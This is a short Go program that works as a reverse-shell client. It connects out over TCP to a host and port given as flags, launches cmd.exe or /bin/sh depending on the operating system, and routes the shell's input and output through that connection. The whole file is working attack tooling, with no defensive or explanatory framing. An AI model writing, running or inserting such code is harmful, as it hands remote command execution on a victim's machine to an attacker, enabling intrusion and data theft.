package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"
)

var verboseIsSet bool = false

func getSystemShell() *exec.Cmd {
	if runtime.GOOS == "windows" {
		if verboseIsSet {
			fmt.Println("[i] Get a cmd shell for windows env")
		}
		return exec.Command("cmd.exe")
	} else {
		if verboseIsSet {
			fmt.Println("[i] Get a sh shell for Linux env")
		}
		return exec.Command("/bin/sh", "-c", "/bin/sh")
	}
}

func main() {
	port := flag.Int("port", 8080, "server port")
	host := flag.String("host", "localhost", "sever address")
	verbose := flag.Bool("verbose", false, "verbosiyu")

	flag.Parse()

	verboseIsSet = *verbose

	//--- Create a newtwork address ---
	listenerAddr := net.JoinHostPort(*host, strconv.Itoa(*port))

	if verboseIsSet {
		fmt.Printf("[i] Connection to listener: %s\n", listenerAddr)
	}

	//--- Create connection ---
	conn, _ := net.Dial("tcp", listenerAddr)

	//--- Get the shell for the current OS ---
	cmd := getSystemShell()

	//--- Redirect input output err to the connection ---
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Run(); err != nil {
		log.Printf("Error during the connection: %v", err)
	}

	if verboseIsSet {
		fmt.Println("[i] Connection closed... ")
	}
}
